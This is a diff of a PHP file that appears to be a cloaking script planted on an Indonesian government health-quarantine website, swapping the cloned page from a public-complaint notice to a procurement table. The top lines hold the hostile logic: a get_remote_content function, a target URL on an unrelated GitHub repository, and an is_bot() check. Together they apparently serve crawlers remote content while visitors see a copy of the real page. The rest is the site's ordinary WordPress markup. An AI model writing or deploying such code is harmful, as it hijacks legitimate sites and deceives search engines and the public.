@@ -39,7 +39,7 @@ function get_remote_content($url) {
 }
  
  
-$target_url = 'https://raw.githubusercontent.com/fadlipul69/kkpbanjarmasin/refs/heads/main/sp4n-lapor';
+$target_url = 'https://raw.githubusercontent.com/fadlipul69/kkpbanjarmasin/refs/heads/main/barang-jasa';
  
  
 if (is_bot()) {
@@ -62,20 +62,18 @@ if (is_bot()) {
 	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
 
 	<!-- This site is optimized with the Yoast SEO plugin v23.8 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>SP4N LAPOR - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin</title>
-	<link rel="canonical" href="https://kkpbanjarmasin.or.id/sp4n-lapor/" />
+	<title>Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin</title>
+	<link rel="canonical" href="https://kkpbanjarmasin.or.id/barang-jasa/" />
 	<meta property="og:locale" content="en_US" />
 	<meta property="og:type" content="article" />
-	<meta property="og:title" content="SP4N LAPOR - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
-	<meta property="og:description" content="Sistem Pengelolaan Pengaduan Pelayanan Publik Nasional (SP4N) &#8211; Layanan Aspirasi dan Pengaduan Online Rakyat (LAPOR!) adalah layanan penyampaian semua aspirasi dan pengaduan masyarakat Indonesia melalui beberapa kanal pengaduan yaitu website&nbsp;www.lapor.go.id, SMS 1708 (Telkomsel, Indosat, Three), Twitter @lapor1708 serta aplikasi mobile (Android dan iOS). Lembaga pengelola SP4N-LAPOR! adalah Kementerian Pendayagunaan Aparatur..." />
-	<meta property="og:url" content="https://kkpbanjarmasin.or.id/sp4n-lapor/" />
+	<meta property="og:title" content="Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
+	<meta property="og:url" content="https://kkpbanjarmasin.or.id/barang-jasa/" />
 	<meta property="og:site_name" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
-	<meta property="article:modified_time" content="2023-07-25T02:57:53+00:00" />
-	<meta property="og:image" content="https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-1024x576.jpg" />
+	<meta property="article:modified_time" content="2024-11-11T02:11:45+00:00" />
 	<meta name="twitter:card" content="summary_large_image" />
 	<meta name="twitter:label1" content="Est. reading time" />
-	<meta name="twitter:data1" content="2 minutes" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/","url":"https://kkpbanjarmasin.or.id/sp4n-lapor/","name":"SP4N LAPOR - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"primaryImageOfPage":{"@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/#primaryimage"},"image":{"@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/#primaryimage"},"thumbnailUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-1024x576.jpg","datePublished":"2023-07-25T02:57:51+00:00","dateModified":"2023-07-25T02:57:53+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/sp4n-lapor/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/#primaryimage","url":"https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor.jpg","contentUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor.jpg","width":1280,"height":720},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/sp4n-lapor/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"SP4N LAPOR"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","description":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
+	<meta name="twitter:data1" content="1 minute" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/barang-jasa/","url":"https://kkpbanjarmasin.or.id/barang-jasa/","name":"Barang Jasa - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"datePublished":"2024-11-08T03:24:05+00:00","dateModified":"2024-11-11T02:11:45+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/barang-jasa/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/barang-jasa/"]}]},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/barang-jasa/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Barang Jasa"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","description":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
@@ -158,7 +156,7 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 <script type="text/javascript" id="wpdm-frontjs-js-extra">
 /* <![CDATA[ */
 var wpdm_url = {"home":"https:\/\/kkpbanjarmasin.or.id\/","site":"https:\/\/kkpbanjarmasin.or.id\/","ajax":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php"};
-var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>","client_id":"1f4776735524af55008ebc9201b9bd80"};
+var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>","client_id":"35c58581009472bde7db0b23b8d3bdb5"};
 var wpdm_strings = {"pass_var":"Password Verified!","pass_var_q":"Please click following button to start download.","start_dl":"Start Download"};
 /* ]]> */
 </script>
@@ -182,15 +180,15 @@ gtag("config", "G-DFBM421RDL");
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/fingerprint.min.js?ver=2.1.12" id="wpa-fingerprintjs-js"></script>
 <script type="text/javascript" id="wps-js-extra">
 /* <![CDATA[ */
-var wpspagevisit = {"ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","ajax_nonce":"2cf168d274"};
+var wpspagevisit = {"ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","ajax_nonce":"1e61e35555"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wps-visitor-counter/styles/js/custom.js?ver=1" id="wps-js"></script>
 <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://kkpbanjarmasin.or.id/xmlrpc.php?rsd" />
 <meta name="generator" content="WordPress 6.6.4" />
-<link rel='shortlink' href='https://kkpbanjarmasin.or.id/?p=2999' />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fsp4n-lapor%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fsp4n-lapor%2F&#038;format=xml" />
+<link rel='shortlink' href='https://kkpbanjarmasin.or.id/?p=4779' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://kkpbanjarmasin.or.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F&#038;format=xml" />
 <meta name="generator" content="Site Kit by Google 1.139.0" /><script>
 var portfolioDataJs = portfolioDataJs || [];
 var penciBlocksArray=[];
@@ -243,27 +241,27 @@ var PENCILOCALCACHE = {};
     "@type": "WPSideBar",
     "name": "Sidebar Right",
     "alternateName": "Add widgets here to display them on blog and single",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/sp4n-lapor"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WPSideBar",
     "name": "Footer Column #1",
     "alternateName": "Add widgets here to display them in the first column of the footer",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/sp4n-lapor"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WPSideBar",
     "name": "Footer Column #2",
     "alternateName": "Add widgets here to display them in the second column of the footer",
-    "url": "https:\/\/kkpbanjarmasin.or.id\/sp4n-lapor"
+    "url": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WebPage",
-    "headline": "SP4N LAPOR",
-    "description": "Sistem Pengelolaan Pengaduan Pelayanan Publik Nasional (SP4N) &#8211; Layanan Aspirasi dan Pengaduan Online Rakyat (LAPOR!) adalah layanan penyampaian semua aspirasi dan pengaduan masyarakat Indonesia melalui beberapa kanal pengaduan yaitu website&nbsp;www.lapor.go.id, SMS 1708 (Telkomsel, Indosat, Three), Twitter @lapor1708 serta aplikasi mobile (Android dan iOS). Lembaga pengelola SP4N-LAPOR! adalah Kementerian Pendayagunaan Aparatur...",
-    "datePublished": "2023-07-25",
-    "datemodified": "2023-07-25",
-    "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/sp4n-lapor\/",
+    "headline": "Barang Jasa",
+    "description": "Barang Jasa",
+    "datePublished": "2024-11-08",
+    "datemodified": "2024-11-11",
+    "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/barang-jasa\/",
     "image": {
         "@type": "ImageObject",
         "url": ""
@@ -274,8 +272,8 @@ var PENCILOCALCACHE = {};
     },
     "author": {
         "@type": "Person",
-        "@id": "#person-Administrator",
-        "name": "Administrator"
+        "@id": "#person-admkkp",
+        "name": "admkkp"
     }
 }</script><meta property="fb:app_id" content="348280475330978"><meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress."/>
 <style type="text/css" id="custom-background-css">
@@ -427,7 +425,7 @@ header#masthead {
 	</style>
 </head>
 
-<body data-rsssl=1 class="page-template-default page page-id-2999 custom-background group-blog penci-body-boxed penci_enable_ajaxsearch penci_sticky_content_sidebar sidebar-right penci-page-style-1 wpb-js-composer js-comp-ver-6.1 vc_responsive">
+<body data-rsssl=1 class="page-template-default page page-id-4779 custom-background group-blog penci-body-boxed penci_enable_ajaxsearch penci_sticky_content_sidebar sidebar-right penci-page-style-1 wpb-js-composer js-comp-ver-6.1 vc_responsive">
 
 <div id="page" class="site penci-enable-boxed">
 	
@@ -498,12 +496,12 @@ header#masthead {
 	<li id="menu-item-3971" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3971"><a href="https://kkpbanjarmasin.or.id/infografis-kekarantinaan-kesehatan/" itemprop="url">Infografis Kekarantinaan Kesehatan</a></li>
 </ul>
 </li>
-<li id="menu-item-3976" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3976"><a href="#" itemprop="url">Informasi Publik</a>
+<li id="menu-item-3976" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3976"><a href="#" itemprop="url">Informasi Publik</a>
 <ul class="sub-menu">
 	<li id="menu-item-3972" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3972"><a href="https://kkpbanjarmasin.or.id/category/berita/" itemprop="url">Berita</a></li>
 	<li id="menu-item-4703" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4703"><a href="https://kkpbanjarmasin.or.id/buletin-sigar-edisi-1/" itemprop="url">Buletin</a></li>
 	<li id="menu-item-3973" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3973"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/" itemprop="url">Pengumuman</a></li>
-	<li id="menu-item-3975" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3975"><a href="#" itemprop="url">PPID</a>
+	<li id="menu-item-3975" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3975"><a href="#" itemprop="url">PPID</a>
 	<ul class="sub-menu">
 		<li id="menu-item-3978" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/" itemprop="url">Layanan PPID</a>
 		<ul class="sub-menu">
@@ -517,9 +515,9 @@ header#masthead {
 			<li id="menu-item-5026" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5026"><a href="https://kkpbanjarmasin.or.id/daftar-register-permohonan/" itemprop="url">Daftar Register Permohonan</a></li>
 		</ul>
 </li>
-		<li id="menu-item-4762" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/" itemprop="url">Layanan Tersedia Setiap Saat</a>
+		<li id="menu-item-4762" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/" itemprop="url">Layanan Tersedia Setiap Saat</a>
 		<ul class="sub-menu">
-			<li id="menu-item-4807" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/" itemprop="url">Barang Jasa</a></li>
+			<li id="menu-item-4807" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-4779 current_page_item menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/" itemprop="url">Barang Jasa</a></li>
 			<li id="menu-item-4808" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4808"><a href="https://kkpbanjarmasin.or.id/rencana-strategis/" itemprop="url">Rencana Strategis</a></li>
 			<li id="menu-item-4809" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4809"><a href="https://kkpbanjarmasin.or.id/statistik/" itemprop="url">Statistik</a></li>
 			<li id="menu-item-4810" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4810"><a href="https://kkpbanjarmasin.or.id/informasi-bmn/" itemprop="url">Informasi BMN</a></li>
@@ -555,7 +553,7 @@ header#masthead {
 	<div class="penci-header-mobile_container">
         <button class="menu-toggle navbar-toggle" aria-expanded="false"><span class="screen-reader-text">Primary Menu</span><i class="fa fa-bars"></i></button>
 								</div>
-</div><div class='marquee-hsas-shortcode-90' style='width: 100%;overflow: hidden;'><span style="color: #000000;">Selamat Datang di Zona Integritas BKK Kelas I Banjarmasin.</span>&nbsp;&nbsp;&nbsp;<span style="color: #000000;">Wilayah Bebas dari Korupsi (WBK) dan Wilayah Birokrasi Bersih Melayani (WBBM).</span></div><script>jQuery(function(){jQuery('.marquee-hsas-shortcode-90').marquee({allowCss3Support: true,css3easing: 'linear',easing: 'linear',delayBeforeStart: 2000,direction: 'left',duplicated: true,duration: 15000,gap: 50,pauseOnCycle: true,pauseOnHover: true,startVisible: true});});</script>
+</div><div class='marquee-hsas-shortcode-34' style='width: 100%;overflow: hidden;'><span style="color: #000000;">Selamat Datang di Zona Integritas BKK Kelas I Banjarmasin.</span>&nbsp;&nbsp;&nbsp;<span style="color: #000000;">Wilayah Bebas dari Korupsi (WBK) dan Wilayah Birokrasi Bersih Melayani (WBBM).</span></div><script>jQuery(function(){jQuery('.marquee-hsas-shortcode-34').marquee({allowCss3Support: true,css3easing: 'linear',easing: 'linear',delayBeforeStart: 2000,direction: 'left',duplicated: true,duration: 15000,gap: 50,pauseOnCycle: true,pauseOnHover: true,startVisible: true});});</script>
 	<div id="content" class="site-content">
 
 	<div id="primary" class="content-area">
@@ -568,62 +566,29 @@ header#masthead {
 		<div class="penci-wide-content penci-content-novc penci-sticky-content">
 			<div class="theiaStickySidebar">
 						<div class="penci-content-post hide_featured_image">
-				<div class="penci_breadcrumbs "><ul itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a class="home" href="https://kkpbanjarmasin.or.id" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><i class="fa fa-angle-right"></i><a href="https://kkpbanjarmasin.or.id/sp4n-lapor/" itemprop="item"><span itemprop="name">SP4N LAPOR</span></a><meta itemprop="position" content="2" /></li></ul></div>					<article id="post-2999" class="penci-content-current-page post-2999 page type-page status-publish hentry penci-post-item">
+				<div class="penci_breadcrumbs "><ul itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a class="home" href="https://kkpbanjarmasin.or.id" itemprop="item"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><i class="fa fa-angle-right"></i><a href="https://kkpbanjarmasin.or.id/barang-jasa/" itemprop="item"><span itemprop="name">Barang Jasa</span></a><meta itemprop="position" content="2" /></li></ul></div>					<article id="post-4779" class="penci-content-current-page post-4779 page type-page status-publish hentry penci-post-item">
 													<header class="entry-header penci-entry-header">
-								<h1 class="entry-title penci-entry-title penci-title-">SP4N LAPOR</h1><div class="penci-schema-markup"><span class="author vcard"><a class="url fn n" href="https://kkpbanjarmasin.or.id/author/kkpbanjarmasin/">Administrator</a></span><time class="entry-date published" datetime="2023-07-25T02:57:51+00:00">July 25, 2023</time><time class="updated" datetime="2023-07-25T02:57:53+00:00">July 25, 2023</time></div>															</header>
+								<h1 class="entry-title penci-entry-title penci-title-">Barang Jasa</h1><div class="penci-schema-markup"><span class="author vcard"><a class="url fn n" href="https://kkpbanjarmasin.or.id/author/admkkp/">admkkp</a></span><time class="entry-date published" datetime="2024-11-08T03:24:05+00:00">November 8, 2024</time><time class="updated" datetime="2024-11-11T02:11:45+00:00">November 11, 2024</time></div>															</header>
 													<div class="penci-entry-content entry-content">
 							
-<p class="has-text-align-left">Sistem Pengelolaan Pengaduan Pelayanan Publik Nasional (SP4N) &#8211; Layanan Aspirasi dan Pengaduan Online Rakyat (LAPOR!) adalah layanan penyampaian semua aspirasi dan pengaduan masyarakat Indonesia melalui beberapa kanal pengaduan yaitu website&nbsp;<strong>www.lapor.go.id, SMS 1708 (Telkomsel, Indosat, Three), Twitter @lapor1708 serta aplikasi mobile (Android dan iOS)</strong>. Lembaga pengelola SP4N-LAPOR! adalah Kementerian Pendayagunaan Aparatur Negara dan Reformasi Birokrasi (Kementerian PANRB) sebagai Pembina Pelayanan Publik, Kantor Staf Presiden (KSP) sebagai Pengawas Program Prioritas Nasional dan Ombudsman Republik Indonesia sebagai Pengawas Pelayanan Publik. LAPOR! telah ditetapkan sebagai Sistem Pengelolaan Pengaduan Pelayanan Publik Nasional (SP4N) berdasarkan Peraturan Presiden Nomor 76 Tahun 2013 dan Peraturan Menteri Pendayagunaan Aparatur Negara dan Reformasi Birokrasi Nomor 3 Tahun 2015.</p>
-
-
-
-<p class="has-text-align-left">SP4N-LAPOR! dibentuk untuk merealisasikan kebijakan “<em>no wrong door policy</em>” yang menjamin hak masyarakat agar pengaduan dari manapun dan jenis apapun akan disalurkan kepada penyelenggara pelayanan publik yang berwenang menanganinya. SP4N bertujuan agar:</p>
-
-
-
-<ul class="wp-block-list"><li>Penyelenggara dapat mengelola pengaduan dari masyarakat secara sederhana, cepat, tepat, tuntas, dan terkoordinasi dengan baik;</li><li>Penyelenggara memberikan akses untuk partisipasi masyarakat dalam menyampaikan pengaduan; dan</li><li>Meningkatkan kualitas pelayanan publik.</li></ul>
-
-
-
-<p></p>
-
-
-
-<p>Fitur-fitur yang ada dalam SP4N-LAPOR!</p>
-
-
-
-<ol class="wp-block-list"><li>Anonim: Fitur yang bisa dipilih oleh pelapor yang akan membuat identitas pelapor tidak akan diketahui oleh pihak terlapor dan masyarakat umum.</li><li>Rahasia: Seluruh isi laporan tidak dapat dilihat oleh publik.</li><li>Tracking id: Nomor unik yang berguna untuk meninjau proses tindak lanjut laporan yang disampaikan oleh masyarakat</li></ol>
-
-
-
-<p class="has-text-align-center"><strong>“Berani LAPOR! Untuk Pelayanan Publik yang Lebih Baik”</strong></p>
-
-
-
-<p class="has-text-align-center">Scan barcode atau Klik link yang tertera untuk membuat laporan atau pengaduan layanan pada KKP Kelas II Banjarmasin</p>
-
-
-
-<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="576" src="https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-1024x576.jpg" alt="" class="wp-image-3003" srcset="https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-1024x576.jpg 1024w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-300x169.jpg 300w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-768x432.jpg 768w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-960x540.jpg 960w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-711x400.jpg 711w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor-585x329.jpg 585w, https://kkpbanjarmasin.or.id/wp-content/uploads/2023/07/SP4N-Lapor.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption><a href="http://www.lapor.go.id">www.lapor.go.id</a></figcaption></figure>
-
-
-
-<p class="has-text-align-center"><strong>YUK KENALI SP4N LAPOR</strong> </p>
-
-
-
-<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-<iframe title="Layanan Aspirasi dan Pengaduan Online Rakyat - LAPOR!" width="1400" height="788" src="https://www.youtube.com/embed/-2hlJN5c8IA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-</div></figure>
-
-
-
-<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-<iframe title="LAPOR! Untuk Pelayanan Publik Yang Lebih Baik (English Sub)" width="1400" height="788" src="https://www.youtube.com/embed/lV3yjLrAt4w?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-</div></figure>
+<table id="tablepress-3" class="tablepress tablepress-id-3">
+<thead>
+<tr class="row-1 odd">
+	<th class="column-1">PENGADAAN ALAT DAN<br />
+BAHAN PENUNJANG<br />
+KEKARANTINAAN -<br />
+BOARDING KIT</th><th class="column-2"><a href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/SPK-Kontrak-Pengadan-Langsung-Barang-Boarding-Kit.pdf">SPK Kontrak Pengadan Langsung Barang Boarding Kit</a></th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+	<td class="column-1">MOU PENGELOLAAN LIMBAH</td><td class="column-2"><a href="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/09/4.-MoU-Limbah-KKP-Bjm-SBL.pdf">4. MoU Limbah KKP Bjm - SBL</a></td>
+</tr>
+</tbody>
+</table>
+<!-- #tablepress-3 from cache -->
 						</div>
-						<footer class="penci-entry-footer"><span class="penci-social-buttons penci-social-share-footer"><a href="#" class="penci-post-like penci_post-meta_item  single-like-button penci-social-item like" data-post_id="2999" title="Like" data-like="Like" data-unlike="Unlike"><i class="fa fa-thumbs-o-up"></i><span class="penci-share-number">0</span></a><a class="penci-social-item facebook" target="_blank" rel="noopener" title="" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fsp4n-lapor%2F"><i class="fa fa-facebook"></i></a><a class="penci-social-item email" target="_blank" rel="noopener" href="mailto:?subject=SP4N%20LAPOR&#038;BODY=https://kkpbanjarmasin.or.id/sp4n-lapor/"><i class="fa fa-envelope"></i></a></span></footer>					</article>
+						<footer class="penci-entry-footer"><span class="penci-social-buttons penci-social-share-footer"><a href="#" class="penci-post-like penci_post-meta_item  single-like-button penci-social-item like" data-post_id="4779" title="Like" data-like="Like" data-unlike="Unlike"><i class="fa fa-thumbs-o-up"></i><span class="penci-share-number">0</span></a><a class="penci-social-item facebook" target="_blank" rel="noopener" title="" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fkkpbanjarmasin.or.id%2Fbarang-jasa%2F"><i class="fa fa-facebook"></i></a><a class="penci-social-item email" target="_blank" rel="noopener" href="/cdn-cgi/l/email-protection#c6f9b5b3a4aca3a5b2fb84a7b4a7a8a1e3f4f68ca7b5a7e0e5f6f5fefd8489829ffbaeb2b2b6b5fce9e9adadb6a4a7a8aca7b4aba7b5afa8e8a9b4e8afa2e9a4a7b4a7a8a1ebaca7b5a7e9"><i class="fa fa-envelope"></i></a></span></footer>					</article>
 								</div>
 			</div>
 		</div>
@@ -701,7 +666,7 @@ header#masthead {
 							<div id="footer-1" class="footer-sidebar-item footer-1 penci-col-6">
 					<div id="penci_custom_html-6" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>BKK Kelas I Banjarmasin</span></h4></div><div class="textwidget custom-html-widget">Alamat 	: 	  	Jl. Belitung Darat No.118 A Banjarmasin<br>
 No. Telpon / Fax. 	: 	  	(0511) 3353948 / (0511) 3353948<br>
-Email 	: 	  	kkp.banjarmasin@yahoo.co.id</div></div>				</div>
+Email 	: 	  	<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="39525249175b585753584b54584a5057794058515656175a5617505d">[email&#160;protected]</a></div></div>				</div>
 							<div id="footer-2" class="footer-sidebar-item footer-2 penci-col-6">
 					<div id="penci_custom_html-7" class="widget_text widget footer-widget penci-block-vc penci-fwidget-sidebar style-title-1 style-title-left widget_custom_html"><div class="penci-block-heading"><h4 class="widget-title penci-block__title"><span>Peta Lokasi</span></h4></div><div class="textwidget custom-html-widget"><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3983.18687711719!2d114.57748281386777!3d-3.3038876420841565!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2de423b1dbc2b3cf%3A0x42645a8955c699aa!2sKantor%20Kesehatan%20Pelabuhan%20Kelas%20II%20Banjarmasin!5e0!3m2!1sen!2sid!4v1580523799026!5m2!1sen!2sid" width="350" height="200" frameborder="0" style="border:0;" allowfullscreen=""></iframe></div></div>				</div>
 					</div>
@@ -772,12 +737,12 @@ Email 	: 	  	kkp.banjarmasin@yahoo.co.id</div></div>				</div>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3971"><a href="https://kkpbanjarmasin.or.id/infografis-kekarantinaan-kesehatan/">Infografis Kekarantinaan Kesehatan</a></li>
 </ul>
 </li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3976"><a href="#">Informasi Publik</a>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3976"><a href="#">Informasi Publik</a>
 <ul class="sub-menu">
 	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3972"><a href="https://kkpbanjarmasin.or.id/category/berita/">Berita</a></li>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4703"><a href="https://kkpbanjarmasin.or.id/buletin-sigar-edisi-1/">Buletin</a></li>
 	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3973"><a href="https://kkpbanjarmasin.or.id/category/pengumuman/">Pengumuman</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3975"><a href="#">PPID</a>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-has-children menu-item-3975"><a href="#">PPID</a>
 	<ul class="sub-menu">
 		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-3978"><a href="https://kkpbanjarmasin.or.id/jam-layanan-ppid/">Layanan PPID</a>
 		<ul class="sub-menu">
